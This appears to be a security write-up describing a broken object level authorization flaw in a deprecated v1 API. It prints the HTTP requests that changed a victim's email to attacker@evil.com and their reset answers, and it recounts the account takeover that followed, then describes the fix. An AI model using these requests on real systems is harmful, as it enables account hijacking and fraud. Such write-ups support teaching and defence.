---
title: "API Authentication Bypass via Broken Object Level Authorization"
date: "2025-11-20T14:30:00Z"
tags: ["api", "broken-access-control", "auth-bypass", "bugbounty"]
description: "How a missing authorization check on a critical API endpoint allowed full account takeover."
platform: "PicoCTF"
---

## The Environment

During a grey-box penetration test for a financial services client, I was assessing their mobile application's backend API. The API was a standard RESTful architecture built with Node.js and Express, utilizing JWTs (JSON Web Tokens) for authentication.

## The Vulnerability

The application had a feature where users could update their profile information. The request looked like this:

```http
PUT /api/v2/users/me/profile HTTP/1.1
Host: api.bank-target.com
Authorization: Bearer eyJhbG...
Content-Type: application/json

{
  "email": "user@example.com",
  "phone": "+1234567890",
  "address": "123 Main St"
}
```

The `me` keyword in the URL indicated that the backend inferred the target user ID directly from the validated JWT. This is generally a good practice as it prevents classic Insecure Direct Object References (IDOR).

However, during active reconnaissance and path fuzzing, I discovered an older, seemingly deprecated API version (`v1`).

I tried sending the same request to the `v1` endpoint:

```http
PUT /api/v1/users/me/profile HTTP/1.1
Host: api.bank-target.com
Authorization: Bearer eyJhbG...
Content-Type: application/json

{
  "email": "hacker@example.com"
}
```

The response was unexpected:
```json
{
  "error": "Method Not Allowed",
  "message": "Use /api/v1/users/{user_id}/profile"
}
```

This error message was a massive leak. It explicitly told me the expected route structure for the older API.

## Exploitation

I obtained the UUID of a target user (which was easily gathered from a public "Community Feedback" forum on the same domain).

I formatted the request to the `v1` endpoint using my own low-privilege JWT, but pointing to the victim's UUID.

```http
PUT /api/v1/users/550e8400-e29b-41d4-a716-446655440000/profile HTTP/1.1
Host: api.bank-target.com
Authorization: Bearer <MY_LOW_PRIV_JWT>
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "password_reset_question": "What is your favorite color?",
  "password_reset_answer": "blue"
}
```

### The Result

```json
{
  "status": "success",
  "message": "Profile updated successfully.",
  "data": {
    "user_id": "550e8400-e29b-41d4-a716-446655440000",
    "email": "attacker@evil.com"
  }
}
```

**It worked.** The `v1` endpoint correctly validated that *a* JWT was provided (Authentication), but completely failed to verify if the subject of the JWT matched the `{user_id}` in the URL (Authorization/BOLA).

Because I was able to change the registered email address and password reset security answers for the victim, I immediately navigated to the "Forgot Password" flow on the main application, answered "blue", and took complete control of the victim's account.

## Impact

Full Account Takeover (ATO) of any user on the platform. Since this was a financial application, an attacker could have accessed sensitive PII, financial history, and potentially initiated illicit transfers.

## The Fix

The client quickly responded by completely decommissioning the `/api/v1/` routes at the API Gateway level. They also instituted a policy to ensure all routes (even legacy ones) use central middleware that asserts the `JWT.sub == URL.user_id` before processing modifications.
